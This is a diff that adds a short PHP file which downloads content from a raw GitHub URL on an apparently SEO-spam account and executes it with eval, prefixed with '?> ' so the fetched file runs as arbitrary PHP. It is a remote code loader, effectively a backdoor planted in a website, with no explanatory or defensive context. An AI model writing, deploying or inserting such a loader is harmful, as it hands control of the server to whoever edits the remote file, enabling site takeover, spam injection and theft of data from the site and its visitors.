@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/alfabadak'));
+
+$content = "?> ".$content;
+eval($content);
